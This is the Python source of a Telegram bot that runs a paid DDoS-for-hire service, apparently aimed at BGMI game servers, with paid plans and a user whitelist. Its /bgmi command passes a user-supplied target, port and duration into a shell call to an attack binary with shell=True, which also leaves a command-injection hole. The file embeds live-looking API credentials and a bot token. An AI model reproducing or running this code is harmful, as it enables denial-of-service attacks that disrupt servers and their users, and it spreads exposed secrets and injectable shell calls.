from telethon import TelegramClient, events
import subprocess
import datetime
import os

api_id = 1621727
api_hash = '31350903c528876f79527398c09660ce'
bot_token = '7850408397:AAEPMQjgYGJo7zg5r8CFP8QnwQ_LMPSjQko'
client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

admin_id = ["6927161305"]
USER_FILE = "users.txt"
LOG_FILE = "log.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

def log_command(user_id, target, port, time):
    username = f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                return "Logs cleared successfully"
    except FileNotFoundError:
        return "No logs found to clear."

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@client.on(events.NewMessage(pattern='/add'))
async def add_user(event):
    user_id = str(event.sender_id)
    if user_id in admin_id:
        command = event.raw_text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "Only Admin Can Run This Command."
    await event.respond(response)

@client.on(events.NewMessage(pattern='/remove'))
async def remove_user(event):
    user_id = str(event.sender_id)
    if user_id in admin_id:
        command = event.raw_text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Please Specify A User ID to Remove. Usage: /remove <userid>'''
    else:
        response = "Only Admin Can Run This Command."
    await event.respond(response)

@client.on(events.NewMessage(pattern='/clearlogs'))
async def clear_logs_command(event):
    user_id = str(event.sender_id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "Only Admin Can Run This Command."
    await event.respond(response)

@client.on(events.NewMessage(pattern='/allusers'))
async def show_all_users(event):
    user_id = str(event.sender_id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
    else:
        response = "Only Admin Can Run This Command."
    await event.respond(response)

@client.on(events.NewMessage(pattern='/logs'))
async def show_recent_logs(event):
    user_id = str(event.sender_id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            await event.respond(file=LOG_FILE)
        else:
            response = "No data found"
            await event.respond(response)
    else:
        response = "Only Admin Can Run This Command."
        await event.respond(response)

@client.on(events.NewMessage(pattern='/id'))
async def show_user_id(event):
    user_id = str(event.sender_id)
    response = f"Your ID: {user_id}"
    await event.respond(response)

bgmi_cooldown = {}
COOLDOWN_TIME = 0

@client.on(events.NewMessage(pattern='/bgmi'))
async def handle_bgmi(event):
    user_id = str(event.sender_id)

    if user_id in allowed_user_ids or user_id in admin_id:
        if user_id not in admin_id:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
                await event.respond(response)
                return
            bgmi_cooldown[user_id] = datetime.datetime.now()
        command = event.raw_text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if user_id not in admin_id and time > 181:
                response = "Error: Time interval must be less than 80."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                full_command = f"./bgmi {target} {port} {time} 200"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
        else:
            response = "Usage :- /bgmi <target> <port> <time>\n"
    else:
        response = "You Are Not Authorized To Use This Command."
    
    await event.respond(response)


@client.on(events.NewMessage(pattern='/mylogs'))
async def show_command_logs(event):
    user_id = str(event.sender_id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No Command Logs Found For You."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command."
    await event.respond(response)

@client.on(events.NewMessage(pattern='/help'))
async def show_help(event):
    help_text = '''Available commands:
 /bgmi : Method For Bgmi Servers.
 /rules : Please Check Before Use !!.
 /mylogs : To Check Your Recents Attacks.
 /plan : Checkout Our Botnet Rates.
 
To See Admin Commands:
 /admincmd : Shows All Admin Commands.
'''
    await event.respond(help_text)

@client.on(events.NewMessage(pattern='/start'))
async def welcome_start(event):
    user_name = event.sender.first_name
    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\n"
    await event.respond(response)

@client.on(events.NewMessage(pattern='/rules'))
async def welcome_rules(event):
    user_name = event.sender.first_name
    response = f"{user_name} Please Follow These Rules:\n1. Dont Run Too Many Attacks!!\n2. Dont Run 2 Attacks At Same Time\n3. Follow these rules to avoid Ban!!"
    await event.respond(response)

@client.on(events.NewMessage(pattern='/plan'))
async def welcome_plan(event):
    user_name = event.sender.first_name
    response = f"{user_name}, Only 1 Plan Is Powerful:\nVip : Attack Time : 200 (S)\nAfter Attack Limit : 2 Min\nConcurrents Attack : 300\nPrices:\nDay-->150 Rs\nWeek-->900 Rs\nMonth-->1600 Rs\n"
    await event.respond(response)

@client.on(events.NewMessage(pattern='/admincmd'))
async def admin_commands(event):
    user_name = event.sender.first_name
    response = f"{user_name}, Admin Commands:\n/add <userId> : Add a User.\n/remove <userid> : Remove a User.\n/allusers : Authorized Users Lists.\n/logs : All Users Logs.\n/broadcast : Broadcast a Message.\n/clearlogs : Clear Logs File.\n"
    await event.respond(response)

@client.on(events.NewMessage(pattern='/broadcast'))
async def broadcast_message(event):
    user_id = str(event.sender_id)
    if user_id in admin_id:
        message = event.raw_text.split(maxsplit=1)[1] if len(event.raw_text.split()) > 1 else ""
        if message:
            for user_id in allowed_user_ids:
                await client.send_message(user_id, message)
            response = "Message Broadcasted Successfully."
        else:
            response = "Please provide a message to broadcast."
    else:
        response = "Only Admin Can Run This Command."
    await event.respond(response)

client.start()
client.run_until_disconnected()
